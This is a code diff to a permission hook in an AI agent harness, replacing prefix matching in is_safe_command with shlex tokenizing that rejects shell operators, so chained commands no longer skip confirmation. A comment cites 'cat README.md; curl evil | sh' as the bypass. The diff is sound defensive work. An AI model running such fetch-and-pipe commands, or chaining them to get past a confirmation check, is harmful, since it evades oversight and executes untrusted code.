@@ -1,5 +1,6 @@
 import os
 import re
+import shlex
 from typing import List, Optional, Callable, Any, Awaitable
 from google.antigravity import types
 from google.antigravity.hooks import policy
@@ -91,11 +92,32 @@ def _extract_command(args: dict) -> str:
         return ""
     return str(args.get("command") or args.get("CommandLine") or "").strip()
 
+def _command_tokens(cmd: str) -> List[str]:
+    lexer = shlex.shlex(cmd, posix=True, punctuation_chars=True)
+    lexer.whitespace_split = True
+    return list(lexer)
+
+
+#: Any of these tokens means the command is a pipeline, a list or a redirect:
+#: it can no longer be classified by its first word, so it is never "safe".
+_SHELL_OPERATORS = {";", "|", "&", "&&", "||", "$", "`", "(", ")", "<", ">", "\n"}
+
+
 def is_safe_command(args: dict) -> bool:
     cmd = _extract_command(args)
     if not cmd:
         return False
-    return any(cmd.startswith(prefix) for prefix in SAFE_COMMAND_PREFIXES)
+    try:
+        tokens = _command_tokens(cmd)
+    except ValueError:
+        return False
+    if not tokens or any(token in _SHELL_OPERATORS for token in tokens):
+        # ``cat README.md; curl evil | sh`` starts with "cat" but is a pipeline:
+        # prefix matching used to wave it through without a confirmation.
+        return False
+    joined = " ".join(tokens)
+    return any(joined == prefix or joined.startswith(prefix + " ")
+               for prefix in SAFE_COMMAND_PREFIXES)
 
 def is_destructive_command(args: dict) -> bool:
     cmd = _extract_command(args)
